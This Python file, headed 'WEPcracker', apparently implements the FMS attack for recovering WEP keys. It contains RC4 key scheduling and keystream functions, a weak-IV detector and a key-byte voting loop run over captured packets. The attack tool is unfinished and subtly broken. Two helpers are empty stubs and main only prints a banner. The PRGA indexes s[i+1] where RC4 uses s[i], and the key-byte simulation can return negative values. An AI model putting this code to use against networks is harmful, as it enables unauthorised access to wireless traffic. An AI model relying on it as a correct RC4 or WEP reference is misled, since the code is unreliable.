#!/usr/bin/env python
__author__ = 'shane'

# N id the size of the seed array for KSA
N = 256


def ksa(k):
    """
    KSA(K)
        Initialization:
        For i = 0 ... N - 1
            S[i] = i
        j = 0
        Scrambling:
        For i = 0 ... N - 1
            j = j + S[i] + K[i mod l]
            Swap(S[i], S[j])

    :param k: the byte array key (IV prepended to the secret key)
    :return: a pseudo random permutation of [0, 1, 2,..., 255]
    """
    s = [i for i in range(N)]
    j = 0
    for i in range(N):
        j = (j + s[i] + k[i % len(k)]) % N
        # Swap(s[i], s[j])
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
    return s


def prga(s, data_length):
    """
    PRGA(K)
        Initialization:
        i = 0
        j = 0
        Generation Loop:
            i = i + 1
            j = j + S[i]
            Swap(S[i], S[j])
            Output z = S[S[i] + S[j]]

    :param s: a pseudo random permutation of [0, 1, 2,..., 255] generated by ksa
    :param data_length: length of the packet data (message + checksum) in bytes
    :return: a byte array to XOR the packet data with
    """
    z = []
    i = 0
    j = 0
    for x in range(data_length):
        i = (i+1) % N
        j = (j + s[i+1]) % N
        # Swap(s[i], s[j])
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
        z.append(s[(s[i] + s[j]) % N])
    return z


def simulate_resolved(b, iv, byte, wep_key):
    """

    :param b: index of the byte in the secret key we want to simulate
    :param iv: IV of the packet we're using
    :param byte: First encrypted byte of the WEP packet
    :param wep_key: secret key
    :return: the simulated value of wep_key[b]
    """
    k = iv + wep_key
    # Perform b + 3 iterations of KSA
    s = [i for i in range(N)]
    j = 0
    for i in range(b + 3):
        j = (j + s[i] + k[i % len(k)]) % N
        # Swap(s[i], s[j])
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
    # Reverse the PRGA/KSA to find the probable value of wep_key[b]
    # 0xAA SNAP Header should be first plaintext byte of WEP packets
    z = byte ^ 0xAA
    return s.index(z) - j - s[b + 3]
    # Will key_byte ever be negative?


def weak_iv(iv, wep_key_len):
    """
    H1kari's method of weak IV detection from:
    http://www.dartmouth.edu/~madory/RC4/wepexp.txt

    :param iv: the iv in question
    :param wep_key_len: the length of the wep key (5 or 13)
    :return: true if iv is weak
    """
    x = iv[0]
    y = iv[1]
    z = iv[2]
    a = (x + y) % N
    b = (x + y - z) % N
    for B in range(wep_key_len):
        if ((0 <= a < B) or (a == B and b == (B + 1) * 2) and (a != (B + 1) / 2 if B % 2 else 1) or
           (a == B + 1 and (b == (B + 1) * 2 if B == 0 else 1)) or
           (x == B + 3 and y == N - 1) or
           ((x == 1 and y == (B / 2) + 1) or (x == (B / 2) + 2 and y == (N - 1) - x) if (B != 0 and not (B % 2)) else 0)):
            return True
    return False


def weak_iv_table():
    return


def check_key(key):
    return

def crack_wep(keysize, packets):
    """
    Analyzes the packets  and for each one it
    """
    key = [0] * keysize
    for keybyte in range(keysize):
        counts = [0] * 256
        for p in packets:
            # construct key counts
            counts[simulate_resolved(keybyte, p[0], p[1], key)] += 1
        # key[keybyte] = index of max(counts)
        key[keybyte] = max(enumerate(counts), key=lambda x: x[1])[0]
    return key


def main():
    print("WEPcracker")